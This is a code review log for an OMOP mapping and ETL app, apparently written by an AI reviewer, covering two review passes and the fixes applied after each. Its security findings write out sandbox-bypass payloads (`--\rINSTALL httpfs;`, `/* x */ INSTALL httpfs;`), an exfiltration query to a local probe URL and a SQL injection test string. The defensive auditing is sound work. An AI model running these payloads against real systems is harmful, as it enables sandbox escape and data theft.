# Code Review Log

Chronological log of code reviews run via the `code-review` skill. Newest entry on top.
Each review covers the commit range from the previous review's `Last reviewed commit` up to the `HEAD` at review time.

> The skill reads the topmost `Last reviewed commit:` to know where to start the next review.

---

## Template (copy for each new review)

```
## YYYY-MM-DD — <short title>

- Reviewed by: <Claude model / person>
- Range: <prev-sha>..<head-sha>  (<N> commits)
- Last reviewed commit: <head-sha>
- Verdict: Ship it | Fix-then-ship | Needs work
- Tests: <pass/fail, N tests> · Lint: <pass/fail>

Findings:
- 🔴 <critical> — file:line — problem → fix
- 🟠 <important> — file:line — problem → fix
- 🟡 <minor> — file:line — problem → fix

Notes / follow-ups:
- ...
```

---

## 2026-08-13 — Concept-mapping source-id ranges + SKOS/CCR alignments + the inline pull rework across 3 scopes (`reviewed_oid` split) + ETL column layout/pause-resume/per-table Parquet + a new automatic storage GC

- Reviewed by: Claude Opus 5 — 5 parallel adversarial Explore sub-agents by feature group (concept mapping; versioning/pull; ETL; storage GC + backend misc; the 12 commits pushed mid-review), plus an independent reviewer pass. **Every 🔴 was re-verified in source by the reviewer and 4 of 5 empirically reproduced** with throwaway probes (all deleted; working tree clean at review end): the keep-local anchor (a vitest probe printing `isComplete=false, mayAnchor=true, reviewedOnly=false`); the GC's mtime premise (three separate `shutil.move`/dedup/subdir-mtime probes); and the ETL sandbox escape (proven against **real DuckDB** — `httpfs` reported `loaded=True, installed=True` through the bypass). One agent claim was **refuted and dropped rather than reported**: the alleged SQL injection in the new source-concept-id search — `escSql` is applied on the `searchId` path and `tupleInClause` escapes both tuple halves on the registry path, and the empty-match case correctly emits `FALSE` instead of falling through to an unfiltered query.
- Range: 0ce8b170..42d3ef4e (**61 commits, 186 files, ~16,313 insertions / ~2,732 deletions**). The user pushed 12 commits mid-review; all were pulled into scope and re-gated.
- Last reviewed commit: 42d3ef4ee20cf5c6d13ae9e741b61269baef360a
- Verdict: **Needs work** — 4 🔴 (one security, two silent-data-loss, one deadlock), plus 🟠/🟡. Two of the 🔴 interact and must be fixed together.
- Tests: frontend **1563 passed** (109 files, +294 vs the 1269 baseline) · backend **891 passed, 1 FAILED, 2 skipped** · Lint: **0 errors, 142 warnings** (all pre-existing React-Compiler class) · Typecheck: `tsc -b` **3 errors, all introduced by this range** · i18n parity: **CLEAN (4421/4421, 0 divergence)** · Hygiene: 0 new `console.log`, 0 new `any`, 0 new `dangerouslySetInnerHTML`, 0 secrets, **0 new dependencies** (uv.lock audited: 78 packages, all from PyPI with hashes; `annotated-doc` verified a genuine `fastapi` transitive, not hallucinated) · VERSION **2.3.1** correctly bumped.

Findings:

**🔴 CRITICAL:**

- 🔴 **db_connect.py:203,246 — a bare `\r` line comment escapes the ETL sandbox guard, reopening the 🔴 that `39078146` closed for `/* */`.** Both `_split_statements` and `_strip_leading_noise` end a `--` comment only at `\n` (`sql.find("\n", i)`), but **DuckDB ends it at a bare `\r`**. **Reproduced end-to-end against real DuckDB**: `--x\rSELECT 42 AS v` → `[(42,)]` (so code after the `\r` genuinely runs), and the payload `--\rINSTALL httpfs;\n--\rLOAD httpfs;` split into **one** "comment" statement, sailed past `_reject_forbidden_statements`, and left `duckdb_extensions()` reporting `httpfs loaded=True, installed=True`. Controls confirm no regression: plain `INSTALL httpfs;` and the old `/* x */ INSTALL httpfs;` are both still blocked. This is the outbound-egress escape the guard exists to prevent, reachable with a two-character prefix. The frontend `sql-tokenizer.ts:34` has the identical `indexOf('\n', i)`, so the stated parity contract holds but both sides are wrong. Fix: terminate line comments on `[\r\n]` in both Python functions and the TS tokenizer; add the CR case to the bypass tests.
- 🔴 **storage_gc.py:126,155 + blob_store.py:64 — the new GC's entire safety premise is false, and it runs automatically at startup.** The module docstring rests on "age proves it is not in flight… a blob or project dir exists for a moment before its row is committed". **Both halves reproduced false**: (a) `shutil.move` **preserves mtime**, so a blob assembled from a slow multi-GB upload lands in the store already aged — probe printed `blob age immediately after store_file: 7200s`, i.e. **instantly past `BLOB_MIN_AGE_SECONDS` (3600)** and deletable while the user is still on the import dialog; the dedup branch (`blob_store.py:62-63`) likewise never refreshes mtime. (b) A directory's mtime does **not** change when files are written in its subdirectories — probe printed `parent mtime changed by writing into subdir? False` — and `project_dir()` puts all real work in `scripts/`/`datasets/`/`environments/`, so a project active for months has a mtime frozen at creation and the 1-hour guard **never** protects it, ahead of an unguarded `shutil.rmtree(d)`. `main.py:100` starts `run_periodic()`, which sweeps **before** its first sleep, with no settings flag to disable it. The existing `test_spares_a_freshly_written_unreferenced_blob` cannot catch this: it builds blobs with `write_bytes` (fresh mtime) instead of `store_file`. Fix: `os.utime(dest, None)` after the move **and** in the dedup branch; derive a project dir's age from its newest descendant; add a sanity floor that skips the sweep when `live` is empty but `projects/` is populated; ship the periodic task dry-run first.
- 🔴 **project-pull.ts:293-298 + etl-pull.ts:494-499 — "keep the local version" advances the 3-way merge BASE over content that was explicitly declined.** `mayAnchor*Pull` returns `true` for keep-local-with-empty-selection, so `complete = true` → `reviewedOnly = !complete = false` → the route takes `set_oid`, which advances **both** cursors (`git_sync_state_service.py:29-36`). **Reproduced with a vitest probe**: declining a 2-item plan printed `isComplete=false, mayAnchor=true, reviewedOnly=false`. The model's own docstring states the violated invariant verbatim (`git_sync_state.py:8-12`): *"It is the BASE of the 3-way merge, so it may only advance when a pull took everything on offer. Moving it on a partial pull would clear the banner and bury the un-taken items for good."* Declining everything is definitionally "we hold none of this commit", yet the code records "we hold all of it", so `pull_preview` (`git_service.py:1035`, `base = side(synced_oid)`) diffs every later pull against the declined commit and never offers those changes again. The keep-local branch is the single place `mayAnchor*` diverges from `isComplete*` — exactly where `reviewedOnly` must be `true`. `etl-pull-anchor.test.ts` asserts `reviewedOnly` for four cases but has **no** keep-local-over-a-non-empty-plan case. Fix: gate the content anchor on `isComplete*` alone and let keep-local record `reviewed_oid` only.
- 🔴 **git_service.py:1291-1322 — `commit_push` never received `reviewed_oid`, so the whole `reviewed_oid` split is inert for its stated purpose.** The migration docstring and `git_sync_state_service.py:39-48` both say the split exists so a decided-but-partial pull **unblocks the push**. But `commit_push`'s signature stops at `synced_oid`, its guard compares `remote_head != synced_oid`, and all three call sites (`git.py:671,953,1329`) pass `(row.synced_oid or None)`. `grep -rn reviewed_oid apps/api/app/` confirms zero occurrences in `commit_push` or its callers. After a partial pull (`set_reviewed_oid` deliberately leaves `synced_oid` put) **every later push is refused with `pull_required`** while the banner reads "up to date" — a deadlock escapable only by the complete pull the user declined. **This interacts with the finding above: the keep-local bug currently masks it** by advancing `synced_oid`; fixing keep-local alone would expose this deadlock immediately. Fix both together — add `reviewed_oid` to `commit_push` and gate on `reviewed_oid or synced_oid`.

**🟠 IMPORTANT:**
- 🟠 **Two gates are red.** `tsc -b` reports **3 errors introduced by this range** — `etl-pull-anchor.test.ts:27,72` and `etl-pull-plan-builder.test.ts:6` construct a `PreparedEtlPull` missing `localByPath`/`localPipeline`. And `test_data_sources.py::test_connection_info_for_a_parquet_folder_points_at_the_directory` **fails**: `971f185e` deliberately stopped setting `path` for a parquet folder ("`path` is deliberately left unset") but never updated the test asserting the old contract, so it dies on `AttributeError: 'NoneType' object has no attribute 'endswith'`. Fix: update the test to assert the new `tables` contract, and add the two missing fields to the test fixtures.
- 🟠 **SourceIdTab.tsx:247,265,298-301 — the source-concept-id registry keys pairs with `__`, which collapses distinct concepts.** The codebase's own convention is ` ` precisely because it cannot occur in data (`source-concept-ids.ts:15`, `mapping-status.ts:6`); this file diverges. **Reproduced**: `("LAB__CHEM","123")` and `("LAB","CHEM__123")` both pack to `LAB__CHEM__123`, so a `Set` of 2 distinct concepts has **size 1** — one concept gets no id and exports as `sourceConceptId: 0`. The same concatenation builds the storage PK at `:301` (`workspaceId__badgeLabel__vocab__code`), so a badge label containing `__` collides rows across badges. Mitigated (not fixed) by `export.ts:336,344` using the same `__` on both write and read, so it round-trips while no value contains the separator. Fix: use ` ` here and in `withRegistryIds`.
- 🟠 **SourceIdTab.tsx:321-343 — a failed chunk write leaves ids assigned but the cursor un-advanced.** `assignIds` persists entries in 5000-row chunks, then saves `nextId` **after** the loop, with no `catch` (only a `finally` resetting spinners). `saveBatch` is a plain HTTP PUT that throws. So a mid-loop failure persists the earlier chunks while `nextId` stays where it was, and the next run re-hands those same ids to different concepts. Fix: advance and persist the cursor before/with each chunk, or roll back the written chunks.
- 🟠 **project-pull.ts:296 + etl-pull.ts:497 — `gitSetSyncState(...).catch(() => {})` still swallows the anchor write.** The sibling swallow was fixed last range (documented at `etl-pull.ts:388-392`) but the anchor call itself was missed: content writes succeed, the cursor write fails, the pull resolves "successfully", and the plan is later rebuilt against a stale base. Both callers already have a `try/catch` that surfaces errors. Fix: let it propagate.
- 🟠 **etl-store.ts:659,681,237 — every "is a run live" guard tests `pipelineRunning` only, but pause sets it `false`, so a paused run is unprotected.** `loadRunHistory` re-checks after its await (last range's fix) yet the check itself misses the paused case, so a remount while paused replaces `runHistory` and `statusesOf` relabels `running` → `stopped`. `clearRunHistory` has the same hole, and `EtlPipelineTab.tsx:1032` disables the trash button on `running` only — so while paused it is **enabled**, and clicking it deletes the history rows while leaving `pausedRun` set; Resume then runs every pending script against the target DB with no history record at all. Fix: add `|| get().pausedRun` to the store guards and `|| !!pausedRun` to the button.
- 🟠 **EtlPipelineTab.tsx:189-194 — resume silently drops scripts deleted or renamed while paused.** Pending ids no longer in `sqlFiles` are filtered out without a word and the run still reports `'success'`; the count shown at `:273` (`pendingFileIds.length`) disagrees with what actually executes (`rest.length`). When `rest.length === 0` the button appears dead and `pausedRun` is stranded. Fix: surface the difference and `discardPausedRun()` on empty.
- 🟠 **import.ts:145-156 — mapping projects exported before `dad22b87` reimport with ids the registry never allocated.** `dad22b87` correctly stopped writing `sourceConceptId` into `mappings.json`, but the import path still spreads a legacy ZIP's ids straight through, and a new ZIP carries none — recovery depends entirely on `source-concept-ids/entries.json`, whose restore is best-effort inside a swallowed `try/catch` at `:183`. A file project *with* a `conceptIdColumn` is excluded from the `withRegistryIds` overlay, so it has no fallback. Fix: seed registry entries from legacy ids when the registry file is absent, and stop swallowing the restore failure.

**🟡 MINOR:**
- 🟡 `SourceIdTab.tsx:163` — `if (end <= start)` rejects a legitimate single-id range, contradicting `rangeCapacity`, which is explicitly inclusive and tested for `(10,10) → 1`. Should be `end < start`.
- 🟡 `SourceIdTab.tsx:381-384` — `reassignAll` passes one pre-loop `fresh` snapshot to every `assignIds` call, so badge *N* allocates from cursors predating badges *1..N-1*. Safe only because the windows are disjoint and each call re-reads its own entries; `reassignBadge` does it correctly. Fix: reload inside the loop.
- 🟡 `git_sync_state_service.py:62-75` — the `synced_oid = ""` sentinel is guarded by five hand-repeated `or None`s at read sites; the next call site added without one passes `""` into `_safe_oid` and turns a benign unanchored state into a 400. Fix: normalise `""` → `None` on read.
- 🟡 `PullPanel.tsx:60` computes `complete` and documents it as "which cursor may advance", but **both** consumers end with `void complete` and re-derive their own notion — two independent completeness computations over one decision map, which is how the 🔴 above arose. Fix: thread it through or drop it from the contract.
- 🟡 `use-pipeline-runner.ts:152` — a pause is detected only after the loop, so a script that fails *after* the pause returns early without `finishPipelineRun`, and the error is dropped from the run's outcome. · `etl-store.ts:601-614` — `discardPausedRun` records a user-initiated stop as `'error'`, while `stopPipelineRun:512` argues the honest label is `'stopped'`. · `EtlPipelineTab.tsx:1090` — `key={script.id}` embeds `Date.now()`; `script.fileId` is unique by construction.
- 🟡 `storage_gc.py:122` — `missing_blobs` is unbounded in the API response; an unmounted volume serialises every sha in the DB into one JSON body. · `blob_store.py:80` — abandoned `<sha>.tmp` files are filtered out by `is_sha()` and so are never collected by any sweep. · No concurrency guard: the admin endpoint and the periodic task can sweep simultaneously.
- 🟡 `mapping-queries.ts:333,341,345` — `%`/`_` are not escaped in `LIKE` terms, so typing `%` matches everything. Pre-existing, not introduced here; correctness wart, not injection.
- 🟡 `PullMappingsTable.tsx` — module-level `_viewCache` is never evicted (slow leak, one small entry per project+branch visited); the 250ms filter debounce is lost if the dialog closes inside the window, which is the very thing `3ba4e78d` set out to preserve.
- 🟡 File sizes past the 800-line threshold, several newly crossed: `MappingsTab.tsx` **3252**, `entity-io.ts` **3095**, `TargetConceptPanel.tsx` **2825**, `GlobalSummaryView.tsx` **2031**, `ConceptSetsTab.tsx` **2009**, `EtlPipelineTab.tsx` **1909** (was 1323), `git.py` **1540**, `git_service.py` **1520**.

Verified sound ✅ (actively probed, no finding):
- **The alleged SQL injection in the new source-concept-id search is NOT real** — traced both new paths to the SQL string. `searchId` goes through `escSql` (`mapping-queries.ts:339-341`), so `1' OR '1'='1` becomes an inert literal; the `registryIdKeys` path never puts user text in SQL at all (the typed string is only a JS `startsWith` predicate over the in-memory registry, and the emitted keys are escaped by `tupleInClause`). The empty-match case deliberately emits `FALSE` rather than falling through to an unfiltered query, and count/row queries share one filter object so they cannot disagree.
- **`clampNextId` is genuinely well-built** — I read every branch and could not construct a collision; the exhaustion sentinel `end + 1` is used consistently, and the property test (`source-id-range.test.ts:73-88`) pins the real invariant across a cursor × high-water-mark cross-product. Bounds are validated against the OMOP custom band at the caller (`SourceIdTab.tsx:161-162`) and overlap is checked on edit.
- **`_reject_forbidden_statements` blocks 25 of 26 bypass shapes** — `/* */`, `--\n`, nested, stacked, `FORCE INSTALL` all correctly refused, and string-literal false positives (`SELECT '-- install httpfs'`) correctly still pass. Only the CR case (🔴 above) escapes.
- **`parquet_table_paths` has no injection surface** — table names are gated by `_SAFE_IDENT.fullmatch` before reaching `CREATE OR REPLACE VIEW`, and paths come from `blob_store.path_for`, which raises on anything not matching `_SHA_RE`. A crafted upload filename is dropped at the identifier check.
- **The GC's ordering and scope are correct** — DB refs are read **before** the filesystem listing in both sweeps (the safe order), it walks three hardcoded roots with no attacker-controlled component, blob names pass `is_sha()` before `root / sha`, `rmtree` targets come from `iterdir()`, and both routes gate on `get_current_admin`. `_SHA_COLUMNS` is complete — all seven `String(64)` sha columns are covered, so no live blob is invisible for reference-tracking reasons. The bugs are in the age premise alone.
- **`script-columns.ts` is correct** — brute-forced `columnNeighbourIndex`/`columnDropIndex`/`columnStartIndex` against `splitIntoColumns` + `arrayMove` for n ∈ {5,7,8,9,11,12,13} × cols ∈ {2,3,4}, every card and target column: zero mismatches. `persistOrder` reassigns dense `0..n-1`, so no duplicate or sparse order values.
- **The prune-script guard from `8ca499a7` is intact** — the `error('No concept is referenced…')` guard still precedes all five `DELETE`s.
- **Migration `d0e1f2a3b4c5` is clean** — `down_revision = c9d0e1f2a3b4` was the sole head (linear, no branch), the column is nullable with no backfill (correct: `sync_state` falls back to `synced_oid` when null), and `downgrade()` is reversible via `batch_alter_table` for SQLite.
- **`PullMappingsTable` pagination cannot lose a decision** — it is a cumulative slice (`rows.slice(0, visibleCount)`), so earlier rows never unmount, and selection is keyed (`Set<string>`) with `setAllVisible`/`allVisibleSelected` iterating the **full** filtered `rows`, not the mounted slice.
- **`15d32824`'s ordering fix is correct** — `afterPull` awaits every step, so status is now computed after `recomputeProjectStats`; state is read via `getState()` rather than a closed-over snapshot, so there is no stale closure and no missing `await`.
- **`81ed5a73` is documentation-only** — the sole executable line (`content_identical = old_raw == new_raw and not old_is_lfs`) is byte-identical before and after, so no real difference can be masked.
- **`source-concepts-diff.ts` is well-reasoned** — the `\x01` join separator is deliberate, the duplicate-`(vocab, code)` occurrence-suffix scheme matches the server's `_key_source_concepts_named` exactly, the multi-line quoted-field CSV parser is a genuine fix, and it fails closed (`keyed: false`) rather than reporting a diff computed from nothing.
- **No shell/path injection in the ~410 new `git_service.py` lines** — `_run` builds argv lists (never `shell=True`), `_safe_ref`/`_safe_oid`/`_safe_join` gate every ref and path, and `_materialize_at`'s only two callers pass a hardcoded literal or a route-allowlisted value.
- **uv.lock is clean** — 78 packages, every one from PyPI with sdist + wheel SHA-256; zero git/path/direct-URL sources; `requires-dist` mirrors `pyproject.toml` exactly; `annotated-doc` verified a genuine `fastapi` transitive.

**Test gaps that let the 🔴s through**: no CR case in the sandbox-bypass tests; `test_storage_gc` builds blobs with `write_bytes` instead of `store_file`, so it cannot exercise the inherited mtime, and nothing tests a project dir whose work is in subdirectories; no keep-local-over-a-non-empty-plan assertion on `reviewedOnly`; no test that a partial pull leaves the push unblocked.

Notes / follow-ups:
- The user pushed 12 commits during the review; all were folded in and re-gated. The last two (`540aed5a`, `42d3ef4e`) ship with their own tests and touch none of the 🔴 areas.
- Carried and still open: the group-access rework items in `docs/planning/users-authorizations-audit.md`; `entity-io.ts` / `seed-loader.ts` / `WorkspacesPage.tsx` past the split threshold, now joined by six more files.

### Fixes applied — 2026-08-14 (all findings, committed)

The user asked for everything to be fixed. **All 4 🔴, all 8 🟠 and the 🟡 batch are done**, each with a test, and **every behavioural fix verified by reverting it and watching the new test fail**. Final gates: frontend **1565 tests** green (was 1555), backend **901 passed / 2 skipped, 0 failed** (was 891/1 failed), `tsc -b` **0 errors** (was 3), lint **0 errors** (142 pre-existing warnings), i18n **4421/4421**. Five commits: `6ec17615`, `284bae22`, `65fbd7e2`, `a98df8a6`, `c5088d1a`.

**🔴 (all fixed):**
- **ETL sandbox CR bypass** — `_split_statements` and `_strip_leading_noise` now end a line comment at `[\r\n]`, and the frontend `sql-tokenizer.ts` with them (the parity contract held, but both sides were wrong). **Re-ran the exploit**: `--\rINSTALL httpfs;` is now blocked in all four shapes, with no false positive on legitimate SQL carrying a `\r` comment. Tests cover the bypass and the splitter's CRLF handling.
- **Storage GC deleting live data** — `blob_store._mark_stored` stamps the mtime on the way in (both the move and the dedup path), and a project dir is aged by its newest descendant. Added a sanity floor that skips the project sweep when the DB reports zero projects but `projects/` is populated. **Four new tests, each verified to fail without its fix**; the pre-existing "spares a fresh blob" test was the blind spot (it built blobs with `write_bytes`, never through `store_file`), so the new ones go through the real path.
- **Keep-local corrupting the merge base** — which cursor may advance is now derived from `isComplete*Pull` alone, at one site. `mayAnchor*Pull` is deleted: it answered "may we record anything" in a shape that read like "do we hold the content", which is exactly how the two were conflated. The panel's `void complete` is gone too — a second independently-computed answer to the same question.
- **`commit_push` missing `reviewed_oid`** — threaded through, gating on `reviewed_oid or synced_oid`, via a `_push_anchors()` helper that also centralises the `synced_oid == ""` coercion the 🟠 flagged as five hand-repeated guards. A test pins that a fully-reviewed partial pull pushes, while a decision cursor that is *also* behind still refuses.

**🟠 (all fixed):**
- **Pair-key collision** — `sourceConceptPairKey` joins with a NUL; `SourceIdTab` routes through it and `splitSourceConceptPairKey`. Scoped to in-memory keying on purpose: the persisted entry id and export format still use `__` on both engines, and changing those is a storage migration, not a review fix.
- **Chunked assign** — the cursor advances after every chunk, so a failed batch can only burn ids, never reuse them.
- **Swallowed anchor write** — `.catch(() => {})` removed on both scopes; the existing caller `try/catch` surfaces it. The project test that pinned the old swallow was rewritten to pin the new contract.
- **Paused runs** — one `runIsLive()` predicate covers `pipelineRunning || pausedRun` across `loadRunHistory`, `clearRunHistory` and `setActivePipeline`, plus the Clear-history button. Two regression tests, both verified against the reverted guard.
- **Resume dropping scripts** — `resumableScripts` is derived once, the toolbar promises that count instead of the stale `pendingFileIds.length`, and an empty resume calls `discardPausedRun()` rather than stranding the hold.
- **Pause-vs-error** — a script that fails after a pause releases the hold and closes the run instead of returning early and dropping the error.
- **Red gates** — the parquet `connection-info` test now asserts the `tables` contract `971f185e` introduced (it still asserted the `path` that commit deliberately stopped setting); the three `PreparedEtlPull` fixtures gained `localByPath`/`localPipeline`.

**🟡 (batch):** single-id ranges accepted (`end < start`, matching the inclusive `rangeCapacity`); `reassignAll` reloads between badges; leaked `<sha>.tmp` files collected (`is_sha` excluded them from every sweep, so they lived for ever); `missing_blobs` capped with an exact `missing_blobs_total`; sweeps serialized behind a lock; run-log rows keyed on `fileId`.

Not done (deliberate): the file-size splits — `MappingsTab.tsx` (3252), `entity-io.ts` (3095), `TargetConceptPanel.tsx` (2825) and the rest are tracked in `docs/planning/README.md`, and splitting them in a fix pass would bury the above. The `__` separator in the persisted entry id and export format is likewise left alone: it round-trips consistently on both engines today, and changing it is a migration with its own golden-test story.

---

## Open items (distilled) — updated 2026-07-22

Carried context so future reviews stop re-litigating resolved/accepted items. Everything else from past reviews is fixed (verified in source 2026-07-22; the fixes landed in commits 371901a3, 0151efaa, 50829010, 40ad31fe, 11462798).

Worth doing (non-blocking):
- entity-io.ts (~2.5k lines), seed-loader.ts (~1.3k), WorkspacesPage.tsx (~1.2k) exceed the 800-line split threshold — entity-io splits naturally into export/import/clone.
- git-content-retry: no token input/hint on auth-gated retry failure (GitContentStatusBadge) — minor server-mode UX.
- PTY sessions have no idle sweep (bounded by WS lifetime; kernel sessions do sweep).

Deferred to the group-access rework (documented in docs/planning/users-authorizations-audit.md):
- `workspace_id is None → no access check` pattern (permissions.py and callers).
- `update_project` doesn't authorize the DESTINATION workspace on move.

Accepted / won't do:
- entries.json wide client scoping (mixed-mode churn) — documented limitation, see docs/planning/versioning-plan.md.
- JWT payload carries an informational `role` (authz always re-reads the DB).
- Author provenance re-links by ORCID/email without a claimed/verified distinction (no privilege attached).
- Minor UI nits: DashboardItemEditDialog persists empty-string descriptions; SchemaPresetsPage uses an inline AlertDialog for import errors; seed-loader duplicates the isShellHtml regex on purpose (decoupling).

---

## 2026-08-11 — The 2026-08-10 review's own fixes landing + ETL vocabulary copy-then-prune (whole-vocabulary copy, generated `99_prune_vocabulary.sql`, checkbox artefact selection persisted on the pipeline) + one-connection ETL script runs over a WebSocket with per-statement streaming

- Reviewed by: Claude Opus 5 — single-reviewer pass, every finding **empirically reproduced** with throwaway probes (all deleted; working tree clean at review end apart from an untracked `apps/api/uv.lock` produced by running the backend suite). The 🔴 was proven end-to-end against real DuckDB including live outbound HTTP egress to a local probe server. Two suspicions were **probed and dismissed rather than reported**: the client transport's error-vs-close race (the `settled` flag holds even with realistic async `onclose` semantics) and the prune script's `NOT IN`/NULL trap (defused by the `IS NOT NULL` filter in step 1 — verified on a seeded OMOP-ish target: used concepts + ancestors + relations kept, unused dropped, `'None'` vocabulary row preserved).
- Range: 9889b7a0..0ce8b170 (**19 commits, 82 files, ~3,029 insertions / ~399 deletions**). Eight of the 19 commits (`701c1f49`..`b5ddefa1`) are the 2026-08-10 review's fixes — verified in source rather than taken on trust.
- Last reviewed commit: 0ce8b1704391b0d63a605ecc1f3006e07853e05e
- Verdict: **Fix-then-ship** — 1 🔴 (a bypass reopening a 🔴 the previous range claimed to close), 1 🟠 (silent whole-vocabulary data loss), 3 🟡. Everything else in the range is sound and the new WebSocket transport is genuinely well-built.
- Tests: frontend **1267 passed** (92 files, +6 vs the 1261 baseline) · backend **836 passed, 2 skipped** (6m33s, full suite) · Lint: **0 errors, 143 warnings** (all pre-existing React-Compiler class, same count as baseline) · Typecheck: `tsc -b` **0 errors** · i18n parity: **CLEAN (4383/4383, 0 divergence)** · Hygiene: 0 new `console.log`, 0 new `any`, 0 new dependencies, 0 secrets, 0 C0 control characters · VERSION `2.3.0` (correctly bumped last range).

Findings:

**🔴 CRITICAL:**

- 🔴 **db_connect.py:222-247 (`_reject_forbidden_statements`) — a leading `/* */` block comment bypasses the ETL extension guard, reopening 🔴#3 of the 2026-08-10 review.** The regex anchors on `^\s*(?:FORCE\s+)?(INSTALL|LOAD|ATTACH)`, but `_split_statements` (`:182`) strips only `--` line comments — **not** block comments, which survive as a prefix on the statement text and defeat the `^\s*` anchor. The function's own docstring asserts "the splitter has already dropped comments"; that is true only of line comments. **Reproduced against real DuckDB on the `needs_file_access` path** (a parquet role — the NORMAL pipeline shape, where `enable_external_access` must stay ON and this guard is the only remaining barrier): `INSTALL httpfs;` → correctly rejected, but `/* x */ INSTALL httpfs;` and `/* x */ LOAD httpfs;` → **both SUCCEEDED**. Then, with httpfs loaded through the bypass, `SELECT * FROM read_csv_auto('http://127.0.0.1:PORT/exfil?stolen=data')` returned `[{'col': 42}]` and the probe server logged 5 hits on `/exfil?stolen=data` — **outbound egress with an attacker-controlled URL and query string**, i.e. the blind-exfiltration channel the fix existed to close. The fix commit's test only covered the plain-prefix case. Fix: teach `_split_statements` about `/* */` (the frontend `sql-tokenizer.ts` already models protected regions — that asymmetry is itself the defect) or strip leading comments before matching; add the block-comment case to the test.

**🟠 IMPORTANT:**

- 🟠 **build-vocabulary-script.ts:105-260 (`buildPruneVocabularyScript`) — running the generated prune script before the CDM tables are populated silently deletes the ENTIRE vocabulary.** The used-concept scan finds no rows, so every `DELETE ... WHERE concept_id NOT IN (SELECT ... FROM tmp_keep_concepts)` empties its table. **Reproduced**: with the CDM table present but empty, `concept 5 -> 0`; with no CDM table at all, `concept 5 -> 0`. No error and no warning, and recovery means re-copying the whole vocabulary from the reference. The script is generated **ticked by default** (`EtlVocabularyTab.tsx:240` defaults `artefacts` to `['csv','script','prune']`) and ordered at 99, so it runs on the next full pipeline run. The generated header comment does tell the user to disable it while mappings are still being added — but a comment is not a guard, and the default is on. Fix: abort when `tmp_used_concepts` is empty (a guard statement that raises), or generate the script disabled.

**🟡 MINOR:**

- 🟡 run-pipeline-sql.ts:203-208 — `statementRunner`'s server branch is now **dead code**. It re-calls `serverStreamTarget()`, the same gate the caller (`:64`) already passed; if it returns a target the stream path took the run, so `runEtlOnServer` is unreachable from this function. Drop the branch.
- 🟡 etl-run-ws.ts:44 — a **pre-aborted** `signal` still opens the socket and sends the script, and the promise never settles until the server closes it. **Reproduced** (the probe timed out at 5s with the SQL already sent). Guarded in practice only because the caller checks `signal?.aborted` first — but there is an `await serverRoles()` between that check and the socket open. Fix: reject immediately if `signal?.aborted` at the top of `runEtlStream`.
- 🟡 data_sources.py:295,322 — the two `except Exception` blocks collapse "unknown source", "no permission" and "a real DB error" into one `WS_1008_POLICY_VIOLATION`, so a genuine server fault is indistinguishable from a permission denial in the logs.

Verified sound ✅ (actively probed, no finding):
- **All five 🔴 fixes from the 2026-08-10 review are real and intact**: the `elif local_head:` anchor adoption is gone from `sync_state` and the route no longer persists an `adoptedOid`; `loadRunHistory` re-checks `pipelineRunning`/`activePipelineId` **after** the await (with `loadPipelineFiles` reading `samePipeline` after its own); `selection` is cleared on a project switch; `readmeLang` travels in the entity JSON, omitted when English so existing exports stay byte-identical, with one `README_FILE_RE` replacing the seven divergent copies; attachments sorted by id on **both** sides.
- **The new WebSocket transport is well-built.** Probed with realistic browser semantics (`onclose` firing asynchronously after our own `ws.close()`): the `settled` flag correctly stops a trailing close from clobbering a real server error message, and a close without `done` rejects with `EtlStreamClosedError` rather than resolving `[]` (which would post "0 rows" and make a half-run script look successful). Auth ordering is **correct** — `authenticate_ws` then `_load_source` with `databases:write`, both **before** `accept()`, matching the established `execution.py` pattern; roles are separately authorized at `databases:read`. Cancellation is right: closing the socket cancels the task, and `run_etl` interrupts the statement and waits for the target file to be released rather than abandoning a thread holding it ATTACHed.
- **The session-state fix addresses a real bug correctly** — `SET VARIABLE` and temp tables genuinely survive between statements now (5 backend tests pin it, including the exact `query(getvariable(...))` shape the prune script uses). The diagnosis in the commit message is accurate: front-only never had it because DuckDB-WASM keeps one connection per tab.
- **The prune script's SQL is otherwise correct** — verified on a seeded target: the `NOT IN` NULL trap is defused by `WHERE concept_id IS NOT NULL` in step 1 (a real CDM table has NULLable `*_concept_id` columns, so this mattered), ancestors and related concepts are retained, unused concepts dropped, and the `'None'` vocabulary row preserved as the commit intended. Scanning `duckdb_columns()` rather than a hand-written column list is the right call.
- **Hygiene sweep clean** — 0 new `console.log`, 0 new `: any`/`as any`, 0 new `dangerouslySetInnerHTML`, 0 hardcoded secrets, **0 new dependencies** (zero hallucinated-package risk), 0 files with C0 control characters across the changed set; i18n **4383/4383**.

Notes / follow-ups:
- Carried and still open: `entity-io.ts` is now **3068** lines (was 2972) and still growing; `seed-loader.ts` / `WorkspacesPage.tsx` past the split threshold; the group-access rework items in `docs/planning/users-authorizations-audit.md`.
- `EtlVocabularyTab.tsx` (710) and `build-vocabulary-script.ts` (776) are both approaching the 800-line threshold — worth watching next range.
- The frontend `sql-tokenizer.ts` handles block comments while the backend `_split_statements` does not. Beyond the 🔴, that divergence means client and server can split the same script differently — worth closing as a shared-contract issue, not just a security patch. **(Closed by the fix pass below.)**

### Fixes applied — 2026-08-11 (all findings, committed)

All 5 findings fixed, each with a test, and **each of the three behavioural fixes verified by removing it and watching the new test fail**. Three commits: `39078146`, `8ca499a7`, `47d89a06`. Final gates: frontend **1269 tests** green (was 1267), backend **838 passed / 2 skipped** (was 836), `tsc -b` **0**, lint **0 errors** (143 pre-existing React-Compiler warnings).

- **🔴 Comment bypass** — `_split_statements` now handles block comments, dollar quotes and quoted identifiers, reaching parity with the frontend tokenizer it claimed to mirror; `_reject_forbidden_statements` strips leading comments before matching the anchored pattern. **Re-ran the exact exploit**: `INSTALL` is now blocked, the probe HTTP server logged **zero** hits (was 5), and a legitimate script with leading/trailing comments still runs. The splitter fix also closes the client/server divergence noted above — a `;` inside `/* */` or `$$…$$` no longer cuts a statement in half server-side. Tests: the bypass in six shapes plus five splitter-parity cases.
- **🟠 Prune wipes the vocabulary** — the scan now ends with a guard that `error()`s when no concept was found, naming the cause and the fix. **Verified against real DuckDB**: the empty-scan case aborts with the vocabulary intact at 5 concepts (was 5 → 0), while the populated case still prunes to the expected 4. The test asserts the guard precedes the first `DELETE`.
- **🟡 Pre-aborted signal** — `runEtlStream` rejects immediately instead of opening the socket and sending the script. Without the fix the new test hangs for 5s (the reported symptom) before failing.
- **🟡 Dead code** — `statementRunner`'s unreachable server branch removed along with the now-unused `runEtlOnServer` import; the function is no longer async and takes only the id it actually uses.
